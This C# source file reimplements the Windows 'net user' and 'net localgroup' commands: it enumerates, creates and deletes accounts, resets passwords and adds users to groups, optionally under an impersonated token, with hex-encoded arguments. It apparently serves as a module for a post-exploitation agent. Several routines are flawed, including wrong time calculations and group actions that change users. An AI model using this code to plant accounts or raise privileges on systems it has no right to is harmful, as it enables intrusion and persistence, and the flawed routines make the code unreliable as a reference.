using System;
using System.IO;
using System.Text;
using System.Security;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Security.Principal;

using System.Net;


public class Module_net
{
    public const string SUCC_CODE       = "0";
    public const string ERR_CODE        = "1";
    public const string NON_TOKEN_VALUE = "0";
   
    private const int LG_INCLUDE_INDIRECT   = 0x0001;
    private const int MAXPREFERREDLENGTH    = -1;
    private const int TIMEQ_FOREVER         = int.MaxValue;
    private const int UF_DONT_EXPIRE_PASSWD = 0x10000;
    private const int UF_PASSWD_NOTREQD     = 0x0020;
    private const int UF_PASSWD_CANT_CHANGE = 0x0040;
    private const uint USER_PRIV_USER       = 1;
    private const uint UF_SCRIPT            = 0x0001;
    private const uint UF_ACCOUNTDISABLE    = 0x0002;


    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct USER_INFO_1
    {
        public string usri1_name;
        public string usri1_password;
        public uint usri1_password_age;
        public uint usri1_priv;
        public string usri1_home_dir;
        public string usri1_comment;
        public uint usri1_flags;
        public string usri1_script_path;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct USER_INFO_3
    {
        public string usri3_name;
        public string usri3_password;
        public uint usri3_password_age;
        public uint usri3_priv;
        public string usri3_home_dir;
        public string usri3_comment;
        public uint usri3_flags;
        public string usri3_script_path;
        public uint usri3_auth_flags;
        public string usri3_full_name;
        public string usri3_usr_comment;
        public string usri3_parms;
        public string usri3_workstations;
        public uint usri3_last_logon;
        public uint usri3_last_logoff;
        public uint usri3_acct_expires;
        public uint usri3_max_storage;
        public uint usri3_units_per_week;
        public IntPtr usri3_logon_hours;
        public uint usri3_bad_pw_count;
        public uint usri3_num_logons;
        public string usri3_logon_server;
        public uint usri3_country_code;
        public uint usri3_code_page;
        public uint usri3_user_id;
        public uint usri3_primary_group_id;
        public string usri3_profile;
        public string usri3_home_dir_drive;
        public uint usri3_password_expired;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct USER_INFO_10
    {
        public string usri10_name;
        public string usri10_comment;
        public string usri10_usr_comment;
        public string usri10_full_name;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct USER_INFO_1003
    {
        [MarshalAs(UnmanagedType.LPWStr)]
        public string usri1003_password;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct LOCALGROUP_MEMBERS_INFO_3
    {
        public string lgrmi3_domainandname;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct LOCALGROUP_INFO_1
    {
        public string lgrpi1_name;
        public string lgrpi1_comment;
    }

    // NET USER 
    [DllImport("Netapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern uint NetUserAdd(
        [MarshalAs(UnmanagedType.LPWStr)] string servername,
        uint level,
        ref USER_INFO_1 buf,
        out uint parm_err
    );
    
    [DllImport("Netapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public extern static int NetUserEnum(
        string servername,
        int level,
        int filter,
        out IntPtr bufptr,
        int prefmaxlen,
        out int entriesread,
        out int totalentries,
        out int resume_handle
    );

    [DllImport("Netapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern int NetUserGetInfo(
        [MarshalAs(UnmanagedType.LPWStr)] string servername,
        [MarshalAs(UnmanagedType.LPWStr)] string username,
        int level,
        out IntPtr bufptr
    );

    [DllImport("Netapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern int NetUserDel(
        [MarshalAs(UnmanagedType.LPWStr)] string servername,
        [MarshalAs(UnmanagedType.LPWStr)] string username
    );
    
    [DllImport("Netapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern int NetUserSetInfo(
        [MarshalAs(UnmanagedType.LPWStr)] string servername,
        [MarshalAs(UnmanagedType.LPWStr)] string username,
        uint level,
        IntPtr buf,
        out uint parm_err
    );

    // NET LOCALGROUP
    [DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
    public static extern int NetLocalGroupEnum(
        string servername,
        int level,
        out IntPtr bufptr,
        int prefmaxlen,
        out int entriesread,
        out int totalentries,
        IntPtr resume_handle
    );

    [DllImport("Netapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern uint NetLocalGroupAddMembers(
        [MarshalAs(UnmanagedType.LPWStr)] string servername,
        [MarshalAs(UnmanagedType.LPWStr)] string groupname,
        uint level,
        ref LOCALGROUP_MEMBERS_INFO_3 buf,
        uint totalentries
    );

    [DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
    public static extern int NetLocalGroupGetMembers(
        string servername,
        string localgroupname,
        int level,
        out IntPtr bufptr,
        int prefmaxlen,
        out int entriesread,
        out int totalentries,
        IntPtr resume_handle
    );

    [DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
    public static extern int NetUserGetLocalGroups(
        string servername,
        string username,
        int level,
        int flags,
        out IntPtr bufptr,
        int prefmaxlen,
        out int entriesread,
        out int totalentries
    );

    [DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
    public static extern int NetUserGetGroups(
        string servername,
        string username,
        int level,
        out IntPtr bufptr,
        int prefmaxlen,
        out int entriesread,
        out int totalentries
    );
    
    [DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
    public static extern int NetLocalGroupGetInfo(
        string servername,
        string localgroupname,
        int level,
        out IntPtr bufptr
    );

    [DllImport("Netapi32.dll")]
    public static extern void NetApiBufferFree(
        IntPtr buffer
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(
        IntPtr hToken
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();


    private void ImpersonateWithToken(string token)
    {
        int token_int = Int32.Parse(token);
        IntPtr targetToken = new IntPtr(token_int);

        string current_username = "";
        using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
        {
            current_username = wid.Name;
        }

        if (!ImpersonateLoggedOnUser(targetToken))
        {
            int errorCode = Marshal.GetLastWin32Error();
            throw new Exception("ImpersonateLoggedOnUser failed with the following error: " + errorCode);
        }

        string impersonate_username = "";
        using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
        {
            impersonate_username = wid.Name;
        }

        if (current_username == impersonate_username)
            throw new Exception("ImpersonateLoggedOnUser worked, but thread running as user " + current_username);
    }

    private string hex2Str(string hex)
    {
        byte[] raw = new byte[hex.Length / 2];
        for (int i = 0; i < raw.Length; i++)
        {
            raw[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
        }
        return Encoding.ASCII.GetString(raw);
    }

    private string normalizePath(string currPath)
    {
        currPath = currPath.Replace("\"", "");
        currPath = currPath.Replace("'", "");
        currPath = currPath.Replace(@"\", "/");
        return currPath;
    }

    private string changeCWD(string cwd)
    {
        try
        {
            Directory.SetCurrentDirectory(cwd);
            return normalizePath(Directory.GetCurrentDirectory());
        }
        catch (Exception ex)
        {
            if (ex is IOException)
                throw new Exception("Path '" + cwd + "' is not a directory");
            else if (ex is DirectoryNotFoundException)
                throw new Exception("Directory '" + cwd + "' does not exist");
            else if (ex is SecurityException)
                throw new Exception("Directory '" + cwd + "' permission denied");
            else if (ex is PathTooLongException)
                throw new Exception("Path '" + cwd + "' exceed the maximum length defined by the system");
            else
                throw new Exception("Move to path '" + cwd + "' failed");
        }
    }

    private string[] parseArguments(string args)
    {
        List<string> arguments_parsed = new List<string>();
        string pattern = @"""[^""]+""|'[^']+'|\S+";
        foreach (Match m in Regex.Matches(args, pattern))
        {
            arguments_parsed.Add(m.Value);
        }
        return arguments_parsed.ToArray();
    }

    private USER_INFO_3 GetUserInfo3(string username, string domain)
    {
        IntPtr userInfoPtr;
        USER_INFO_3 userInfo3 = new USER_INFO_3();
        int resultCode = NetUserGetInfo(domain, username, 3, out userInfoPtr);
        if (resultCode == 0)
        {
            userInfo3 = (USER_INFO_3)Marshal.PtrToStructure(userInfoPtr, typeof(USER_INFO_3));
            NetApiBufferFree(userInfoPtr);
        }
        return userInfo3;
    }

    private List<string> GetUserLocalGroups(string username, string domain)
    {
        List<string> localGroups = new List<string>();
        IntPtr buffer;
        int entriesRead, totalEntries;
        int result = NetUserGetLocalGroups(domain, username, 0, LG_INCLUDE_INDIRECT, out buffer, MAXPREFERREDLENGTH, out entriesRead, out totalEntries);
        if (result == 0)
        {
            for (int i = 0; i < entriesRead; i++)
            {
                string groupName = Marshal.PtrToStringUni(Marshal.ReadIntPtr(buffer, i * IntPtr.Size));
                localGroups.Add(groupName);
            }
            NetApiBufferFree(buffer);
        }
        return localGroups;
    }

    private List<string> GetUserGlobalGroups(string username, string domain)
    {
        List<string> globalGroups = new List<string>();
        IntPtr buffer;
        int entriesRead, totalEntries;
        int result = NetUserGetGroups(domain, username, 0, out buffer, MAXPREFERREDLENGTH, out entriesRead, out totalEntries);
        if (result == 0)
        {
            for (int i = 0; i < entriesRead; i++)
            {
                string groupName = Marshal.PtrToStringUni(Marshal.ReadIntPtr(buffer, i * IntPtr.Size));
                globalGroups.Add(groupName);
            }
            NetApiBufferFree(buffer);
        }
        return globalGroups;
    }

    private List<string> GetAllLocalGroups(string domain)
    {
        List<string> groups = new List<string>();
        IntPtr buffer;
        int entriesRead, totalEntries;
        int result = NetLocalGroupEnum(domain, 1, out buffer, MAXPREFERREDLENGTH, out entriesRead, out totalEntries, IntPtr.Zero);
        if (result == 0)
        {
            for (int i = 0; i < entriesRead; i++)
            {
                IntPtr current = new IntPtr(buffer.ToInt64() + (i * Marshal.SizeOf(typeof(LOCALGROUP_INFO_1))));
                LOCALGROUP_INFO_1 groupInfo = (LOCALGROUP_INFO_1)Marshal.PtrToStructure(current, typeof(LOCALGROUP_INFO_1));
                groups.Add(groupInfo.lgrpi1_name);
            }
            NetApiBufferFree(buffer);
        }
        return groups;
    }

    private List<string> GetLocalGroupMembers(string groupName)
    {
        List<string> members = new List<string>();
        IntPtr buffer;
        int entriesRead, totalEntries;
        int result = NetLocalGroupGetMembers(null, groupName, 3, out buffer, MAXPREFERREDLENGTH, out entriesRead, out totalEntries, IntPtr.Zero);
        if (result == 0)
        {
            for (int i = 0; i < entriesRead; i++)
            {
                IntPtr current = new IntPtr(buffer.ToInt64() + (i * Marshal.SizeOf(typeof(LOCALGROUP_MEMBERS_INFO_3))));
                LOCALGROUP_MEMBERS_INFO_3 memberInfo = (LOCALGROUP_MEMBERS_INFO_3)Marshal.PtrToStructure(current, typeof(LOCALGROUP_MEMBERS_INFO_3));
                members.Add(memberInfo.lgrmi3_domainandname);
            }
            NetApiBufferFree(buffer);
        }
        return members;
    }

    private bool AddUserToLocalGroup(string username, string groupName, string domain)
    {
        LOCALGROUP_MEMBERS_INFO_3 memberInfo = new LOCALGROUP_MEMBERS_INFO_3();
        memberInfo.lgrmi3_domainandname = username;

        uint result = NetLocalGroupAddMembers(domain, groupName, 3, ref memberInfo, 1);
        return (result == 0);
    }

    private string[] doNetUser(string action, string[] parm_args)
    {
        string result = "";
        try
        {
            if (action == "list")
            {
                IntPtr bufPtr = IntPtr.Zero;
                int entriesRead;
                int totalEntries;
                int resumeHandle = 0;

                string domain = parm_args[0];

                int resultCode = NetUserEnum(domain, 10, 2, out bufPtr, -1, out entriesRead, out totalEntries, out resumeHandle);
                if (resultCode == 0 && bufPtr != IntPtr.Zero)
                {
                    // Determinar la longitud máxima del nombre de usuario para el alineamiento.
                    int maxLength = 0;
                    IntPtr tempBufPtr = bufPtr;
                    for (int i = 0; i < entriesRead; i++)
                    {
                        USER_INFO_10 userInfo = (USER_INFO_10)Marshal.PtrToStructure(tempBufPtr, typeof(USER_INFO_10));
                        maxLength = Math.Max(maxLength, userInfo.usri10_name.Length);
                        tempBufPtr = new IntPtr(tempBufPtr.ToInt64() + Marshal.SizeOf(typeof(USER_INFO_10)));
                    }

                    int numberOfColumns = (int)Math.Ceiling((double)entriesRead / 4);

                    for (int col = 0; col < numberOfColumns; col++)
                    {
                        for (int row = 0; row < 4; row++)
                        {
                            int index = col * 4 + row;
                            if (index < entriesRead)
                            {
                                USER_INFO_10 userInfo = (USER_INFO_10)Marshal.PtrToStructure(bufPtr, typeof(USER_INFO_10));
                                result += userInfo.usri10_name.PadRight(maxLength + 2); // Agregamos 2 para un espacio extra
                                bufPtr = new IntPtr(bufPtr.ToInt64() + Marshal.SizeOf(typeof(USER_INFO_10)));
                            }
                        }
                        result += Environment.NewLine;
                    }
                }
            }

            else if (action == "add")
            {
                string domain = parm_args[0];
                string username =  parm_args[1];
                string password = parm_args[2];
                
                USER_INFO_1 userInfo = new USER_INFO_1
                {
                    usri1_name = username,
                    usri1_password = password,
                    usri1_priv = USER_PRIV_USER,
                    usri1_home_dir = null,
                    usri1_comment = "",
                    usri1_flags = UF_SCRIPT,
                    usri1_script_path = null
                };

                uint paramError;
                uint resultAddUser = NetUserAdd(domain, 1, ref userInfo, out paramError);
                
                if (resultAddUser != 0)
                {
                    throw new Exception(string.Format("Failed to create user. Error code: {0}", resultAddUser));
                }
                result += "The user '" + username + " in the '" + domain + "' has been created successfully." + Environment.NewLine;
            }
            else if (action == "info")
            {
                string domain = parm_args[0];
                string username = parm_args[1];
                
                
                USER_INFO_3 userInfo3 = GetUserInfo3(username, domain);                

                // Username
                result += "Username: \t" + userInfo3.usri3_name + Environment.NewLine;

                // Full Name
                result += "Full Name: \t" + (string.IsNullOrEmpty(userInfo3.usri3_full_name) ? "None" : userInfo3.usri3_full_name) + Environment.NewLine;


                // Comment
                result += "Comment: \t" + (string.IsNullOrEmpty(userInfo3.usri3_comment) ? "None" : userInfo3.usri3_comment) + Environment.NewLine;

                // User comment
                //result += "User Comment: \t" + userInfo3.usri3_usr_comment + Environment.NewLine;
                result += "User Comment: \t" + (string.IsNullOrEmpty(userInfo3.usri3_usr_comment) ? "None" : userInfo3.usri3_usr_comment) + Environment.NewLine;

                // Country code
                string countryCode = userInfo3.usri3_country_code.ToString();
                result += "Country or Region Code: \t" + (countryCode == "0" ? "000 (Default for computer)" : countryCode) + Environment.NewLine;

                // Account active
                bool accountActive = (userInfo3.usri3_flags & UF_ACCOUNTDISABLE) == 0; // Assuming UF_ACCOUNTDISABLE is the constant for the account disable flag
                result += "Account Active: \t" + (accountActive ? "Yes" : "No") + Environment.NewLine;
 
                // Account expiry
                bool accountExpires = userInfo3.usri3_acct_expires != TIMEQ_FOREVER; // Assuming TIMEQ_FOREVER is the constant indicating the account never expires
                result += "Account Expires: \t" + (accountExpires ? "Specific Date" : "Never") + Environment.NewLine;

                 // Last Password Change
                DateTime lastPwdChange = DateTime.Now.AddSeconds(-userInfo3.usri3_password_age);
                result += "Last Password Change: \t" + lastPwdChange.ToString("dd/MM/yyyy HH:mm:ss") + Environment.NewLine;

                // Password Expires
                bool passwordNeverExpires = (userInfo3.usri3_flags & UF_DONT_EXPIRE_PASSWD) != 0; // Assuming UF_DONT_EXPIRE_PASSWD is the flag for non-expiring passwords
                result += "Password Expires: \t" + (passwordNeverExpires ? "Never" : "Specific Date") + Environment.NewLine; // You may need to calculate the specific date based on your organization's policy

                // Next Password Change (This would be based on your organization's password policy. As an example, I'm adding 30 days to the last change)
                DateTime nextPwdChange = lastPwdChange.AddDays(30);
                result += "Password Change: \t" + nextPwdChange.ToString("dd/MM/yyyy HH:mm:ss") + Environment.NewLine;

                // Password Required
                bool passwordRequired = (userInfo3.usri3_flags & UF_PASSWD_NOTREQD) == 0; // Assuming UF_PASSWD_NOTREQD is the flag for "password not required"
                result += "Password Required: \t" + (passwordRequired ? "Yes" : "No") + Environment.NewLine;

                // User Can Change Password
                bool userCannotChangePassword = (userInfo3.usri3_flags & UF_PASSWD_CANT_CHANGE) != 0; // Assuming UF_PASSWD_CANT_CHANGE is the flag for "user can't change password"
                result += "User Can Change Password: \t" + (userCannotChangePassword ? "No" : "Yes") + Environment.NewLine;
            
                // Authorized Workstations
                string authorizedWorkstations = string.IsNullOrEmpty(userInfo3.usri3_workstations) ? "All" : userInfo3.usri3_workstations;
                result += "Authorized Workstations: \t" + authorizedWorkstations + Environment.NewLine;

                // Logon Script
                result += "Logon Script: \t" + (string.IsNullOrEmpty(userInfo3.usri3_script_path) ? "None" : userInfo3.usri3_script_path) + Environment.NewLine;

                // User Profile
                result += "User Profile: \t" + (string.IsNullOrEmpty(userInfo3.usri3_profile) ? "None" : userInfo3.usri3_profile) + Environment.NewLine;

                // Home Directory
                result += "Home Directory: \t" + (string.IsNullOrEmpty(userInfo3.usri3_home_dir) ? "None" : userInfo3.usri3_home_dir) + Environment.NewLine;

                // Last Logon
                DateTime lastLogon = DateTime.Now.AddSeconds(-userInfo3.usri3_last_logon); // Assuming the value is in seconds since last logon
                result += "Last Logon: \t" + lastLogon.ToString("dd/MM/yyyy HH:mm:ss") + Environment.NewLine;
            
                // Extract logon hours
                byte[] logonHours = new byte[21];
                Marshal.Copy(userInfo3.usri3_logon_hours, logonHours, 0, 21);

                bool allHoursEnabled = true;
                for (int i = 0; i < logonHours.Length; i++)
                {
                    if (logonHours[i] != 0xFF)
                    {
                        allHoursEnabled = false;
                        break;
                    }
                }

                if (allHoursEnabled)
                {
                    result += "Authorized logon hours: \tAll" + Environment.NewLine;
                }
                else
                {
                    result += "Authorized logon hours: \tCustom" + Environment.NewLine; // or parse the specific hours
                }

                // Get local groups
                List<string> localGroups = GetUserLocalGroups(username, domain);
                result += "Members of local group: \t" + (localGroups.Count > 0 ? string.Join(", ", localGroups) : "None") + Environment.NewLine;
 
                // Get global groups
                List<string> globalGroups = GetUserGlobalGroups(username, domain);
                result += "Members of global group: \t" + (globalGroups.Count > 0 ? string.Join(", ", globalGroups) : "None") + Environment.NewLine + Environment.NewLine;
           
            }
            else if (action == "edit")
            {
                string domain = parm_args[0];
                string username = parm_args[1];
                string newPassword = parm_args[2];
                
                USER_INFO_1003 userInfoToUpdate = new USER_INFO_1003
                {
                    usri1003_password = newPassword
                };

                IntPtr userInfoPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(USER_INFO_1)));
                Marshal.StructureToPtr(userInfoToUpdate, userInfoPtr, false);

                uint parm_err;
                int resultCode = NetUserSetInfo(domain, username, 1003, userInfoPtr, out parm_err);

                if (resultCode == 0)
                {
                    result += "Password for user '" + username + "' in the '"+ domain +  "' has been successfully updated." + Environment.NewLine;
                }
                else
                {
                    result += "Failed to update for user '" + username + "' in the '" + domain + "'. Error code: " + resultCode + Environment.NewLine;
                }

                Marshal.FreeHGlobal(userInfoPtr);
            }
            else if (action == "delete")
            {
                string domain = parm_args[0];
                string username = parm_args[1];

                int resultCode = NetUserDel(domain, username);

                if (resultCode == 0)
                {
                    result += "User " + username + "' in the '"+ domain + " has been successfully deleted." + Environment.NewLine;
                }
                else
                {
                    result += "Failed to delete user '" + username + "' in the '"+ domain + "'. Error code: " + resultCode + Environment.NewLine;
                }
            }
        }
        catch(Exception ex)
        {
            result += ex.ToString() + Environment.NewLine;
            return new string[]{ERR_CODE, result};
        }

        return new string[]{SUCC_CODE, result};
    }
    
    private string[] doNetLocalgroup(string action, string[] parm_args)
    {
        string result = "";
        try
        {
            if (action == "list")
            {
                string domain = parm_args[0];

                // Get all groups
                List<string> allGroups = GetAllLocalGroups(domain);
                
                // Get the host name
                string hostName = Dns.GetHostName();

                if (allGroups.Count > 0)
                {
                    for (int i = 0; i < allGroups.Count; i++)
                    {
                        result += "*" + allGroups[i] + Environment.NewLine;
                    }

                    result += Environment.NewLine +"Command completed successfully." + Environment.NewLine;
                }
                else
                {
                    result += "No local groups found." + Environment.NewLine;
                }
            }
            else if (action == "add")
            {
                string domain = parm_args[0];
                string usernameToAdd = parm_args[1];
                string groupName = normalizePath(parm_args[2]);
                               
                bool success = AddUserToLocalGroup(usernameToAdd, groupName, domain);
                if (success)
                {
                    result += "User '" + usernameToAdd + "' in the '"+ domain + "' added to group '" + groupName + "' successfully." + Environment.NewLine;
                }
                else
                {
                    result += "Failed to add user '" + usernameToAdd + "' in the '"+ domain + "' to group '" + groupName + "'." + Environment.NewLine;
                }
            }
            else if (action == "info")
            {
                string domain = parm_args[0];
                string groupName = normalizePath(parm_args[1]);
                
                // Get group details
                IntPtr groupInfoPtr;
                int resultCode = NetLocalGroupGetInfo(domain, groupName, 1, out groupInfoPtr);
                if (resultCode == 0)
                {
                    LOCALGROUP_INFO_1 groupInfo = (LOCALGROUP_INFO_1)Marshal.PtrToStructure(groupInfoPtr, typeof(LOCALGROUP_INFO_1));
                    result += "Alias Name: " + groupInfo.lgrpi1_name + Environment.NewLine;
                    result += "Comment: " + groupInfo.lgrpi1_comment + Environment.NewLine + Environment.NewLine;
                    NetApiBufferFree(groupInfoPtr);
                }

                // Get members of the local group
                List<string> groupMembers = GetLocalGroupMembers(groupName);
                foreach (string member in groupMembers)
                {
                    result += member + Environment.NewLine;
                }
            }
            else if (action == "edit")
            {
                string domain = parm_args[0];
                string username = parm_args[1];
                string newPassword = parm_args[2];
                
                USER_INFO_1003 userInfoToUpdate = new USER_INFO_1003
                {
                    usri1003_password = newPassword
                };

                IntPtr userInfoPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(USER_INFO_1)));
                Marshal.StructureToPtr(userInfoToUpdate, userInfoPtr, false);

                uint parm_err;
                int resultCode = NetUserSetInfo(domain, username, 1003, userInfoPtr, out parm_err);

                if (resultCode == 0)
                {
                    result += "Password for user '" + username + "' in the '"+ domain + "' has been successfully updated." + Environment.NewLine;
                }
                else
                {
                    result += "Failed to update for user '" + username + "' in the '"+ domain + "'. Error code: " + resultCode + Environment.NewLine;
                }

                Marshal.FreeHGlobal(userInfoPtr);
            }
            else if (action == "delete")
            {
                string domain = parm_args[0];
                string username = parm_args[1];
            
                int resultCode = NetUserDel(domain, username);

                if (resultCode == 0)
                {
                    result += "User " + username + "' in the '"+ domain + " has been successfully deleted." + Environment.NewLine;
                }
                else
                {
                    result += "Failed to delete user '" + username + "' in the '"+ domain + "'. Error code: " + resultCode + Environment.NewLine;
                }
            }
        }
        catch(Exception ex)
        {
            result += ex.ToString() + Environment.NewLine;
            return new string[]{ERR_CODE, result};
        }

        return new string[]{SUCC_CODE, result};
    }

    public string[] execute(string[] args)
    {
        string result = "";		
        List<string> nargs = new List<string>(args);

        if (nargs.Count <= 0)
        {
            result = "Invalid arguments provided. Use net" + Environment.NewLine;
            return new string[]{ERR_CODE, result};
        }

        string option = nargs[0];
        string action = nargs[1];

        string[] parm_args = null;

        if (nargs.Count > 2)
        {
            List<string> parmList = new List<string>();
            for (int i = 2; i < nargs.Count; i++)
            {
                parmList.Add(nargs[i]);
            }
            parm_args = parmList.ToArray();
        }
        switch (option)
        {
            case "user":
                return doNetUser(action,parm_args);
            case "group":
                return doNetLocalgroup(action,parm_args);
            case "domain":
                return new string[]{ERR_CODE, "Not implemented yet" + Environment.NewLine};
            default:
                return new string[]{ERR_CODE, "Invalid argument '" + option + "'. Use net [user|group]" + Environment.NewLine};
        }
   }

    public string[] go(string cwd, string args, string token)
    {
        string[] results = new string[]{SUCC_CODE, ""};
        string pwd = Directory.GetCurrentDirectory();

        try
        {
            if (token != NON_TOKEN_VALUE)
                ImpersonateWithToken(token);

            string new_cwd = changeCWD(cwd);
            string[] arguments_parsed = parseArguments(hex2Str(args));
            
            results = execute(arguments_parsed);
        }
        catch (Exception ex)
        {
            results[0] = ERR_CODE;
            results[1] = ex.ToString();
        }
        finally
        {
            changeCWD(pwd);
            if (token != NON_TOKEN_VALUE)
                RevertToSelf();
        }
        return results;
    }

    public static void Main(string[] args)
    {
        Module_net m = new Module_net();
        String[] results = m.execute(args);
        Console.WriteLine(results[0]);
        Console.WriteLine(results[1]);
        return;
    }
}
